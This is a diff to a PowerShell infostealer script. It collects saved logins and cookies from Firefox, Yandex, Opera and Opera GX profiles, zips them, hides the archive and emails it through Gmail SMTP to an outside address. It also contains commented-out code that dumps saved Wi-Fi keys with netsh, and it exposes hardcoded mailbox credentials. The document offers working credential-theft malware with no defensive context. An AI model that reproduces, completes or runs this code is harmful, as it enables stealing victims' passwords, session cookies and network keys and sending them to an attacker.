@@ -16,6 +16,10 @@ $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.jso
         2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
         3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies");
         4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies")}
+###########
+$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
+$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
+$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com")
 
 for ($i=0; $i -lt 5; $i++){
   if(Test-Path -Path $lst[$i][0]){
@@ -31,11 +35,19 @@ for ($i=0; $i -lt 5; $i++){
         .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
 #       Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
     }
+    attrib +H $p
   }
   else{
     echo $lst[$i][1];
-    $e=$e+' '+$lst[$i][1]
+#     $e=$e+' '+$lst[$i][1]
+    $ReportEmail.Subject="Error: "+$lst[$i][1]
   }
+  $s=New-Object Net.Mail.Attachment($p);
+  if("WinRAR"-in $arh)
+    {$ReportEmail.Attachments.Add($s)}
+  else
+    {$ReportEmail.Attachments.Add($s)};
+  $SMTPInfo.Send($ReportEmail)
 }
 
 # echo "56565656565656565656565656"
@@ -47,19 +59,16 @@ for ($i=0; $i -lt 5; $i++){
 #   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
 # echo "dadasdasdasdasasd"
 #######################
-attrib +H $p
 
-$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
-$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Error: "+$e
-$s=New-Object Net.Mail.Attachment($p);
-if("WinRAR"-in $arh)
-  {$ReportEmail.Attachments.Add($s)}
-else
-  {$ReportEmail.Attachments.Add($s)};
-$ff = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize)
-$ff
+
+# $s=New-Object Net.Mail.Attachment($p);
+# if("WinRAR"-in $arh)
+#   {$ReportEmail.Attachments.Add($s)}
+# else
+#   {$ReportEmail.Attachments.Add($s)};
+# $ff = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize)
+# $ff
 
 $ReportEmail.Body = $ff
 $SMTPInfo.Send($ReportEmail)
